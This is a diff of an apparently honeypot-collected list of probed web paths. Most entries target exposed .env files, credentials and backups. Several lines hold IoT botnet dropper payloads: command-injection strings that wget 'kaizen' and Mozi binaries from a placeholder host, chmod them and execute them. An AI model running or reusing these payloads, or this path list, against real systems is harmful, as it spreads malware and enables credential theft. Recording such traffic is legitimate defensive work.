@@ -136,6 +136,7 @@ test
 .env.production.php
 .env.sample.php
 API/.env
+_
 _phpinfo=-1
 _url=.env
 apis/.env
@@ -152,7 +153,6 @@ system/.env
 test/.env.php
 twilio/.env.php
 var/.env.local.php
-_
 app/config/parameters.yml
 auth/.env
 store/.env
@@ -416,6 +416,7 @@ backend/.env.local
 backup.tar.gz
 dana-na/auth/url_default/welcome.cgi
 deploy/.env
+ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
 secrets.py
 sftp.json
 terraform.tfstate.backup
@@ -425,7 +426,6 @@ wp-content/.env
 .env_1
 autodiscover/autodiscover.json_@zdi/Powershell
 backup.zip
-ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
 local_settings.py
 openapi.json
 server-status
@@ -979,6 +979,7 @@ admin/login
 admin/reports/status
 admin/reports/updates
 administrator/manifests/files/joomla.xml
+ads.txt
 allversions
 alpha/.env
 amplify/team-provider-info.json
@@ -1383,7 +1384,6 @@ administrator/phpmyadmin/index.php_lang=en
 administrator/pma/index.php_lang=en
 administrator/web/index.php_lang=en
 adminpanel
-ads.txt
 agora/.env
 amplifyconfiguration.json
 angular/config.json
@@ -2424,6 +2424,7 @@ frontend/react/.env
 frontendfinaltest/.env
 gcloud/credentials.json
 gemini.yml
+geoserver/wfs_service=WFS_request=GetCapabilities
 git/.env
 github-connect/.env
 github/.env
@@ -2741,6 +2742,7 @@ shared/.env.staging
 shared/.env.swp
 shared/.env.test
 shared/.env.uat
+shell_cmd=cd+/tmp%3Bwget+-q+http://127.0.0.1/a3f8d2/kaizen.mips+-O+.k%3Bchmod+777+.k%3B./.k+selfrep.mvp%3Bwget+-q+http://127.0.0.1/a3f8d2/kaizen.mpsl+-O+.k%3Bchmod+777+.k%3B./.k+selfrep.mvp%3Bwget+-q+http://127.0.0.1/a3f8d2/kaizen.arm7+-O+.k%3Bchmod+777+.k%3B./.k+selfrep.mvp
 shibboleth/.env
 shop/.env.local
 shop/.env.production
@@ -4287,9 +4289,9 @@ gb6mlorz6ohbq2
 gcp-credentials.json_v=18e6211053e8e65a
 gcp/credentials.json
 gemini/.env_v=18e621119232eb8e
+geoserver/ows_service=WFS_request=GetCapabilities
 geoserver/rest/about/version.json
 geoserver/rest/about/version.json_v=18e6211cd4369a4b
-geoserver/wfs_service=WFS_request=GetCapabilities
 ghost/
 ghost/.env
 ghost/api/admin/
@@ -4534,6 +4536,7 @@ log-viewer/logs
 log.tar.gz
 log.txt
 log/app.log_v=18e6211e01dbad22
+login.cgi_cli=aa%20aa%27_cd%20/tmp_wget%20-q%20http://127.0.0.1/a3f8d2/kaizen.mips%20-O%20.k%26%26chmod%20777%20.k%26%26./.k%20selfrep.dlink%26%26exit_wget%20-q%20http://127.0.0.1/a3f8d2/kaizen.mpsl%20-O%20.k%26%26chmod%20777%20.k%26%26./.k%20selfrep.dlink%26%26exit_wget%20-q%20http://127.0.0.1/a3f8d2/kaizen.arm7%20-O%20.k%26%26chmod%20777%20.k%26%26./.k%20selfrep.dlink%26%26exit_wget%20-q%20http://127.0.0.1/a3f8d2/kaizen.arm%20-O%20.k%26%26chmod%20777%20.k%26%26./.k%20selfrep.dlink%27_
 login/%252eenv
 login/_next=/
 logs.tar.gz
@@ -4730,6 +4733,7 @@ opt/app/.env
 order/.env_v=9JYfS
 orders/.env
 output/.env
+ows_service=WFS_request=GetCapabilities
 p91qzvtg54713g
 package.json_v=18e6211e28c12b42
 package/%252eenv
@@ -4987,7 +4991,6 @@ shell_cd+/tmp_rm_DEFANGED+__wget+http://127.0.0.1:37019/Mozi.a_chmod+777+Mozi.a_
 shell_cd+/tmp_rm_DEFANGED+__wget+http://127.0.0.1:39791/Mozi.a_chmod+777+Mozi.a_/tmp/Mozi.a+jaws
 shell_cd+/tmp_rm_DEFANGED+__wget+http://127.0.0.1:40675/Mozi.a_chmod+777+Mozi.a_/tmp/Mozi.a+jaws
 shell_cd+/tmp_rm_DEFANGED+__wget+http://127.0.0.1:41886/Mozi.a_chmod+777+Mozi.a_/tmp/Mozi.a+jaws
-shell_cmd=cd+/tmp%3Bwget+-q+http://127.0.0.1/a3f8d2/kaizen.mips+-O+.k%3Bchmod+777+.k%3B./.k+selfrep.mvp%3Bwget+-q+http://127.0.0.1/a3f8d2/kaizen.mpsl+-O+.k%3Bchmod+777+.k%3B./.k+selfrep.mvp%3Bwget+-q+http://127.0.0.1/a3f8d2/kaizen.arm7+-O+.k%3Bchmod+777+.k%3B./.k+selfrep.mvp
 site-backup.zip_v=18e6211c4ee12c48
 site.zip_v=18e6211c5dadc151
 site/.env_v=18e6211266a83631
@@ -5264,6 +5267,7 @@ webpack.config.js_v=18e6211f8eca67f6
 website/.env_v=18e62111a9652313
 website/wp-includes/wlwmanifest.xml
 webvpn/
+wfs_service=WFS_request=GetCapabilities
 wg07c87q705po6
 wgcgi.cgi
 whm
